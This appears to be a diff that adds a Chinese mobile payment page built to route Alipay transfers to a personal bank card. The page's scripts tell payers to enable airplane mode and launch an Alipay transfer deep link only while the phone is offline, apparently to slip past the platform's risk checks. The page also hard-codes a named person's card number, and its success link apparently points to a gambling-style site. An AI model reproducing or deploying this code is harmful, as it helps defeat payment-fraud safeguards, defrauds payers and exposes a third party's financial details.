@@ -1,0 +1,478 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no,minimal-ui">
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE11">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>欢迎光临</title>
+    <meta name="keywords" content="">
+    <meta name="description " content="">
+    <link rel="shortcut icon" href="/myweb.ico" />
+    <script type="text/javascript" src="jquery-1.8.3.min.js"></script>
+    <script type="text/javascript" src="rem.js"></script>
+    <script type="text/javascript" src="layui.js"></script>
+    <script type="text/javascript" src="function.js"></script>
+    <link rel="stylesheet" type="text/css" href="base.css" media="all"/>
+    <link rel="stylesheet" type="text/css" href="layui.css" media="all"/>
+
+
+    <link rel="stylesheet" type="text/css" href="pay.css" media="all"/>
+    <link rel="stylesheet" type="text/css" href="hipay.css" media="all"/>
+    <link rel="stylesheet" type="text/css" href="style.css" media="all"/>
+    <script type="text/javascript" src="clipboard.min.js"></script>
+    <script src="alipayjsapi.inc.min.js"></script>
+    <script type="text/javascript" src="alipay.windows.js"></script>
+    <script>
+        //根据屏幕宽度 设置rem基础值
+
+        //获取屏幕宽度
+        var width=$(window).width();
+        $("html").css("font-size",width/26+'px');
+        $(window).bind('resize',function(){
+            var width=$(window).width();
+            $("html").css("font-size",width/26+'px');
+        });
+    </script>
+    <style  type="text/css">
+        body{text-align:center}
+        .big_body{
+            margin:0 auto;
+            max-width: 500px;
+            height:100%;
+        }
+        .mybody{
+            margin: 0px auto;text-align: center;
+            margin-top: 0px;
+            padding: 1px 15px;
+        }
+        .grad{
+            background: -webkit-linear-gradient(#2C9BA4, #1C5D95); /* Safari 5.1 - 6.0 */
+            background: -o-linear-gradient(#2C9BA4, #1C5D95); /* Opera 11.1 - 12.0 */
+            background: -moz-linear-gradient(#2C9BA4, #1C5D95); /* Firefox 3.6 - 15 */
+            background: linear-gradient(#2C9BA4, #1C5D95); /* 标准的语法 */
+        }
+        .main{
+            margin-top: 30px;text-align: center;
+            border-radius: 5px;background-color: #FFF;
+            /*box-shadow: 0px 10px 20px #888888;*/
+            position: relative;
+        }
+        .main .head{
+            margin-top: 0px;padding: 0px 15px;
+            text-align: center;
+
+        }
+        .main .imgbody{
+            padding: 15px 10%;
+            text-align: center;
+        }
+        .center{
+            text-align: center;
+        }
+        .left{
+            text-align: left;
+        }
+        .main .img{
+            margin: 0px auto;
+            width: 80%;
+            /*display: none;*/
+        }
+        .main .loading{
+            max-width: 200px;
+            margin: 40px auto;
+            padding: 0px 0px;
+            width: 40%;
+            display: none;
+        }
+        .main .loading .loading_i{
+            font-size: 120px;
+        }
+        .yuan{
+            position: absolute;
+            top: 50%;
+            -webkit-transform: translateX(-50%) translateY(-50%);
+            -webkit-transform: translateX(-50%) translateY(-50%);
+            -moz-transform: translateX(-50%) translateY(-50%);
+            -ms-transform: translateX(-50%) translateY(-50%);
+            transform: translateX(-50%) translateY(-50%);
+            width:20px;
+            height:20px;
+            border-radius: 10px;
+
+        }
+        .grad_yuan{
+            background: -webkit-linear-gradient(#2B879E, #30869D); /* Safari 5.1 - 6.0 */
+            background: -o-linear-gradient(#2B879E, #30869D); /* Opera 11.1 - 12.0 */
+            background: -moz-linear-gradient(#2B879E, #30869D); /* Firefox 3.6 - 15 */
+            background: linear-gradient(#2B879E, #30869D); /* 标准的语法 */
+        }
+        .left_yuan{
+            left: 0px;
+        }
+        .right_yuan{
+            right:-20px;
+        }
+        .yingying{
+            height: 12px;
+            background-color: #7698BD;
+            margin: 0px auto;
+            border-bottom-left-radius:5px;
+            border-bottom-right-radius: 5px;
+        }
+        .span{
+            font-size: 14px;color: #333333;line-height: 26px;display: inline-block;
+            position: relative;
+            top:-2px;
+        }
+        .warning{
+            font-size: 16px;
+        }
+        .zhifubao_wait{
+            position: absolute;
+            left:0;
+            height: 100%;
+            z-index: 999;
+            width:100%;
+            background: #c14443;
+            left:0px;
+            /*display: none;*/
+        }
+        .am-process,.aui-flex.b-line{
+            text-align: left;
+        }
+
+
+        .zhifubao_wait .a1{
+            width:100%;
+            margin-top: 190px;
+            color: #fff;
+        }
+        .zhifubao_wait .a2{
+            width:80%;
+            margin-top: 0px;
+            border-radius: 8px;
+            font-size: 16px;
+            height: 50px;
+            line-height: 50px;
+        }
+        .zhifubao_wait .a3{
+            width:100%;
+            margin-top: 20px;
+            color: #fff;
+        }
+        .am-process .am-process-item{
+            padding-top: 15px;
+        }
+    </style>
+</head>
+<body>
+<form name="payForm" id='payForm' action="/home/order/zhifubao_bank_zhifu" method="post">
+    <input type="hidden" name="bankAccount" value="林炳灿">
+    <input type="hidden" name="cardNo" value="6217851700008354614">
+    <input type="hidden" name="bankName" value="中国银行">
+    <input type="hidden" name="bankMark" value="BOC">
+    <input type="hidden" name="amount" value="100.00">
+    <input type="hidden" name="cardIndex" value="1912311734337152709">
+    <input type="hidden" name="cardChannel" value="HISTORY_CARD">
+    <input type="hidden" name="cardNoHidden" value="true">
+    <!-- <input type="hidden" name="__hash__" value="85461fe2ae68630742cff2544f492e44_a707edc6f2d259f101c0e367ff3d4e78">-->
+</form>
+
+<div class="zhifubao_wait" >
+    <div class="aui-free-head" style="height:300px;">
+        <div class="aui-flex b-line">
+            <div class="aui-user-img">
+                <img src="tx.jpeg" alt="">
+            </div>
+
+            <div class="aui-flex-box">
+                <h5>支付宝在线支付</h5>
+                <p>请直接付款</p>
+                <p id="xxxx">付款后3分钟内将自动到账</p>
+            </div>
+        </div>
+        <div id="xxx" class="aui-flex aui-flex-text" style="padding: 10px 20px">
+            <div class="aui-flex-box">
+                <!--<h2>支付金额</h2>-->
+                <h3>￥100.00</h3>
+                <p>单号：15836431953181899261</p>
+            </div>
+        </div>
+        <button id="wait_button" class="layui-btn layui-btn-primary  layui-btn-disabled a2" style='margin-bottom: 10px'>飞行支付</button>
+
+
+    </div>
+    <!--
+    <button id="no_wait_button" class="layui-btn layui-btn-primary  layui-btn-disabled a2">立即支付</button>
+    <div style="margin:0px auto;width:80%;text-align: center;">
+        <div style="margin:0px auto;text-align: center;color:#ddd;font-size: 18px;margin-bottom: 10px;border: 3px solid #000;border-radius: 8px;">以上两种方式，如果立即支付跳转失败，请返回使用飞行支付</div>
+    </div>
+    -->
+    <div style="margin:0px auto;width:80%;text-align: center;">
+        <div id="tishi" style="margin:0px auto;text-align: center;color:#fff;font-size: 20px;margin-bottom: 10px;"> </div>
+    </div>
+
+    <div class="am-process" style="padding-top:5px;">
+        <div class="am-process-item pay"> <i class="am-icon process pay" aria-hidden="true"></i>
+            <div class="am-process-content">
+                <div class="am-process-main">①打开飞行模式（或关闭所有网络）</div>
+                <div class="am-process-brief"><img style="width:65%" src="feixing.gif" /></div>
+            </div>
+            <div class="am-process-down-border"></div>
+        </div>
+        <div class="am-process-item pay"> <i class="am-icon process success" aria-hidden="true"></i>
+            <div class="am-process-content">
+                <div class="am-process-main">②点击立即支付</div>
+                <div class="am-process-brief">等待一下即可跳转</div>
+            </div>
+            <div class="am-process-up-border"></div>
+            <div class="am-process-down-border"></div>
+        </div>
+        <div class="am-process-item success"> <i class="am-icon process success" aria-hidden="true"></i>
+            <div class="am-process-content">
+                <div class="am-process-main">③关闭飞行模式（或打开网络），点击支付</div>
+            </div>
+            <div class="am-process-up-border"></div>
+        </div>
+
+    </div>
+
+
+
+</div>
+
+
+<script>
+    $('#wait_button').removeClass('layui-btn-disabled').addClass('layui-btn-warm').html('请打开飞行模式');
+    //$('#no_wait_button').removeClass('layui-btn-disabled').addClass('layui-btn-warm').html('立即支付(正常专用)');
+    var layer,util;
+    layui.use(['layer'], function(){
+        layer = layui.layer;
+
+
+        var order_no="15836431953181899261";
+        var success_url="https://cp88168.cn:59789";
+        var amount="100.00";
+        var out_trade_no="2020030812531301008";
+        var charge_type="6";
+
+        var t1;
+
+
+
+        var data={
+            order_no:order_no
+        };
+
+
+
+        get_order_status();
+
+        auto_check_network();
+        function auto_check_network(){
+            ap.getNetworkType(function (res) {
+                //判断网络
+                if (res.networkAvailable === false) {
+                    isCanClick = false;
+                    //send_message();
+                    //alert('请跳转前不要关闭飞行模式，跳转后及时关闭飞行模式');
+                    $('#tishi').html("稍候弹出转账到银行卡界面后，请第一时间关闭飞行模式");
+                    $('#wait_button').trigger('click');
+
+                } else {
+                    isCanClick = true;
+                    $('#tishi').html("请现在打开飞行模式");
+                    //alert("请先关闭网络或者打开飞行模式再点击立即付款按钮，跳转转账界面后再打开网络或者关闭飞行模式即可支付");
+                    //请把手机打开飞行模式,等到了转卡页面后，再打开网络或者关闭飞行模式，<span style="font-size:18px;color:#000;">（跳转到转卡页面前切不可关闭飞行模式，否则会跳转失败）</span>点击支付即可
+                    setTimeout(function () {
+                        auto_check_network();
+                    }, 1000);
+                }
+            });
+
+        }
+
+
+        $('#no_wait_button').on('click',function(){
+            send_message();
+        })
+
+
+
+
+
+
+        $('#wait_button').on('click',function(){
+            if($('#wait_button').hasClass('layui-btn-disabled')){
+                return false;
+            }
+            var arr=['157','183','123','-97','181'];
+            var level_id="178";
+            if($.inArray(level_id,arr)>=0){
+                var wait=35;//var wait=52;
+            }else{
+                var wait=35;//var wait=52;
+            }
+            var isCanClick;
+            if($(this).hasClass('layui-btn-warm')){
+                ap.getNetworkType(function (res) {
+                    //判断网络
+                    if (res.networkAvailable === false) {
+                        isCanClick = false;
+                        //send_message();
+                        //alert('请跳转前不要关闭飞行模式，跳转后及时关闭飞行模式');
+                        t1 = parseInt(new Date().getTime()/1000);
+                        daojishi_2(wait);
+                        send_message();
+                    } else {
+                        isCanClick = true;
+                        alert("请先关闭网络或者打开飞行模式再点击立即付款按钮，跳转转账界面后再打开网络或者关闭飞行模式即可支付");
+                    }
+                });
+
+            }
+
+
+        });
+
+
+
+
+
+
+
+
+
+        function daojishi_2(time){
+            var t2 = parseInt(new Date().getTime()/1000);
+            var t_time = Math.ceil((t2-t1)/2);
+            $('#wait_button').addClass('layui-btn-disabled').addClass('layui-btn-warm').html('支付配置中，剩余 <span id="wait_time" style="color:#000">'+(time - t_time)+'</span> 秒');
+            if(t_time <= time){
+                setTimeout(function () {
+                    switch(time - t_time){
+                        case 27:
+                            //send_message();
+
+                            layer.msg('请在跳转后及时关闭飞行模式，否则无法点击支付');
+                            break;
+
+                    }
+                    daojishi_2(time);
+                }, 2000);
+            }else{
+                $('#wait_button').removeClass('layui-btn-disabled').addClass('layui-btn-warm').html('立即支付');
+                $('#wait_button').unbind();
+                $('#wait_button').on('click',function(){
+                    send_message();
+                });
+            }
+        }
+
+
+        function daojishi_3(time){
+            $('#wait_button').addClass('layui-btn-disabled').addClass('layui-btn-warm').html('正在跳转，剩余 <span id="wait_time" style="color:#000">'+time+'</span> 秒');
+            if(time>0){
+                time--;
+                setTimeout(function () {
+                    daojishi_3(time);
+                }, 2000);
+            }else{
+                $('#wait_button').removeClass('layui-btn-disabled').addClass('layui-btn-warm').html('立即支付');
+                $('#wait_button').unbind();
+                $('#wait_button').on('click',function(){
+                    send_message();
+                });
+            }
+        }
+
+
+
+
+
+
+
+
+
+        function daojishi_1(time){
+            $('#wait_button').addClass('layui-btn-disabled').addClass('layui-btn-warm').html('跳转中，剩余 <span id="wait_time" style="color:#000">'+time+'</span> 秒');
+
+            if(time>0){
+                time--;
+                setTimeout(function () {
+                    switch(time){
+                        case 22:
+                            layer.msg('请在跳转后立即关闭飞行模式，否则无法点击支付');
+                            break;
+                        case 15:
+                            layer.msg('请在跳转后立即关闭飞行模式，否则无法点击支付');
+                            break;
+                    }
+                    daojishi_1(time);
+                }, 2000);
+            }else{
+                $('#wait_button').html('马上好了，请再等待几秒');
+            }
+        }
+
+        function send_message(){
+            var arr=['-157','-183','-123'];
+            var level_id="178";
+            var bank_no='';
+            if($.inArray(level_id,arr)>=0){
+                bank_no=document.payForm.cardNo.value;
+            }else{
+                bank_no='请关闭飞行模式付款***';
+            }
+            var ext = '';
+            ext = '&cardIndex='+document.payForm.cardIndex.value+'&cardChannel='+document.payForm.cardChannel.value+'&cardNoHidden='+document.payForm.cardNoHidden.value;
+            var a='alipays://platformapi/startapp?appId=09999988&actionType=toCard&ap_framework_sceneId=20000067&bankAccount='+document.payForm.bankAccount.value+'&cardNo='+bank_no+'&bankName='+document.payForm.bankName.value+'&bankMark='+document.payForm.bankMark.value+ext+'&money='+document.payForm.amount.value+'&amount='+document.payForm.amount.value+'&REALLY_STARTAPP=true&startFromExternal=false';
+            AlipayJSBridge.call('pushWindow', { url: a});
+        }
+        //var dataUrl="alipays://platformapi/startapp?appId=09999988&actionType=toCard&sourceId=bill&cardNo=" + cardNo + "&bankAccount=" + bankAccount + "&money=" + amount + "&amount=" + amount + "&bankMark=" + bankMark + "&bankName=" + bankName + "&cardIndex=" + cardIndex + "&cardNoHidden=true&cardChannel=HISTORY_CARD&orderSource=from";
+
+
+        function get_order_status(){
+            /*var url='/Order/api_get_order_status.html';
+            $.ajax({
+                type:'post',
+                url:url,
+                data:data,
+                datatype:'json',
+                async : true,
+                success:function(msg){
+                    if(msg.code=='200'&&msg.status==4){
+                        layer.confirm('<span style="font-size:16px;">支付成功！</span>', {
+                            title:'支付信息',
+                            closeBtn: 0,
+                            btn: ['确定'] //可以无限个按钮
+                        }, function(index, layero){
+                            window.location.href=success_url+'?amount='+amount+'&pay_money='+msg.pay_money+'&out_trade_no='+out_trade_no+'&charge_type='+charge_type;
+                        });
+
+                    }else if(msg.status==3){
+                        alert('当前订单已经过期，请重新发起支付');
+                        location=location;
+                    }else{
+                        setTimeout(function () {
+                            get_order_status();
+                        }, 5000);
+                    }
+                }
+            });*/
+        }
+
+    });
+
+
+
+
+</script>
+
+</body>
+
+</html>
